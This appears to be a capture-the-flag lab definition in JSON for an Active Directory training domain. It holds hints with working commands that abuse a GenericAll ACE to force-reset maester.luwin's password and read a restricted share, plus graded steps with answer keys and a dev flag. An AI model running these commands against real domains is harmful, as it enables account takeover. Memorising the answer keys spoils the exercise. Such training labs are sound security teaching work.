@@ -1,0 +1,79 @@
+{
+  "objectives": [
+    {
+      "key": "main",
+      "title": "Read the flag",
+      "prompt": "From the hodor foothold, find the GenericAll control edge over maester.luwin, abuse it to reset maester.luwin's password (no old password needed), then authenticate as maester.luwin and read flag.txt from the //dc/archive share that only maester.luwin may open.",
+      "check": {
+        "evidence": "SECRET",
+        "format": "FLAG{%s}"
+      },
+      "dev": "FLAG{dev-ad-acl-genericall-maester-luwin}",
+      "hints": [
+        "hodor is a normal domain user (hodor / Hodor123!). Point your resolver and /etc/krb5.conf at the DC, then read the DACL of candidate users to find an ACE granting hodor full control: dacledit.py -action read -principal hodor -target-dn '<DN>' -dc-ip <dc> 'NORTH/hodor:Hodor123!' (or a BloodHound GenericAll edge). The target is maester.luwin.",
+        "GenericAll (full control) over a user object includes the right to reset its password without knowing the current one. Force a new password: net rpc password maester.luwin 'NewPassw0rd!' -U 'NORTH\\hodor%Hodor123!' -S dc.north.sevenkingdoms.local (or bloodyAD set password over LDAPS).",
+        "Authenticate as maester.luwin with the password you just set and read the flag: smbclient //dc/archive -U 'NORTH\\maester.luwin%NewPassw0rd!' -c 'get flag.txt'. hodor itself is denied that share."
+      ],
+      "steps": [
+        {
+          "key": "technique",
+          "title": "Name the technique",
+          "prompt": "What class of attack abuses an over-permissioned access-control entry (such as GenericAll or GenericWrite) to take control of a target principal?",
+          "check": {
+            "answer": [
+              "acl abuse",
+              "acl-based attack",
+              "dacl abuse",
+              "access control list abuse"
+            ]
+          }
+        },
+        {
+          "key": "ace",
+          "title": "Name the ACE",
+          "prompt": "Which access right does hodor hold over the target, giving full control of the object? (name of the right)",
+          "check": {
+            "answer": [
+              "genericall",
+              "generic all",
+              "ga",
+              "full control"
+            ]
+          }
+        },
+        {
+          "key": "target",
+          "title": "Find the target",
+          "prompt": "Which higher-value account does hodor control via the ACE? (username)",
+          "check": {
+            "answer": [
+              "maester.luwin",
+              "north\\maester.luwin"
+            ]
+          }
+        },
+        {
+          "key": "primitive",
+          "title": "Name the primitive",
+          "prompt": "Which takeover primitive does GenericAll enable here, letting you set a new password without the old one? (two words)",
+          "check": {
+            "answer": [
+              "password reset",
+              "targeted password reset",
+              "force password change",
+              "reset password"
+            ]
+          }
+        },
+        {
+          "key": "right",
+          "title": "Name the extended right",
+          "prompt": "GenericAll includes which control-access right that specifically permits forcing a password without the current one? (name or its common label)",
+          "check": {
+            "answer_regex": "reset[ -]?password|user[-_ ]?force[-_ ]?change[-_ ]?password|force[-_ ]?change[-_ ]?password"
+          }
+        }
+      ]
+    }
+  ]
+}
